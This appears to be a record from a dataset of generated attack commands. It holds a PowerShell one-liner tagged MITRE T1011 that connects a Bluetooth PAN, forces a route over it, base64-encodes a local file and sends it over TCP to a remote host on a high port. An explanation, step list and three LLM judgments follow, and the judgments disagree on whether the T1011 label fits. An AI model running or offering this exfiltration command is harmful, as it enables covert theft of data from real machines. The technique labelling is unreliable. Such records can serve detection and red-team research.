command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $ad=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1); netsh interface ip set address name="$($ad.Name)" static 10.241.56.2 255.255.255.252 | Out-Null; route add 10.241.56.1 mask 255.255.255.255 10.241.56.2 if $($ad.ifIndex) metric 5 | Out-Null; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\ProgramData\misc.bin')); $c=New-Object Net.Sockets.TcpClient; $c.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.241.56.2'),0)); $c.Connect('10.241.56.1',54107); $s=$c.GetStream(); $x=[Text.Encoding]::UTF8.GetBytes($b); $s.Write($x,0,$x.Length); $s.Close(); $c.Close()
explanation: Pins a host route to the Bluetooth interface to prevent crossover, then exfiltrates base64 data over a custom TCP port via the Bluetooth PAN (T1011).
rationale_steps: Connect Bluetooth NAP to use a different medium.
Set a static address on the Bluetooth adapter using netsh.
Add a host route bound to the Bluetooth interface index to force path selection.
Bind TCP socket to the Bluetooth IP and transmit base64 payload to a high port.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax, and appropriate use of variables and pipeline operations.
llm_judgments.semantic_justification: The command aligns well with T1011 by establishing a Bluetooth connection and exfiltrating data over a custom TCP connection, though it's more aligned with exfiltration over alternative protocol (T1048) than searching closed sources.

llm_judgments.syntactic_justification: The PowerShell one-liner is well-formed with balanced quotes/parentheses, valid separators, and correct variable expansion/pipelining.
llm_judgments.semantic_justification: It plausibly exfiltrates base64 data over a Bluetooth PAN (aligned with T1011) by binding and routing to that interface, but it likely needs admin rights for netsh/route and assumes BluetoothCL.exe can initiate a NAP connection.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using valid Powershell syntax for external command execution, variable assignment, object creation, and method calls, with correct separators and no parsing errors.
llm_judgments.semantic_justification: The command performs data exfiltration via Bluetooth, which directly contradicts the definition of MITRE ATT&CK T1011 'Search Closed Sources,' an intelligence gathering technique focused on acquiring external non-public information.
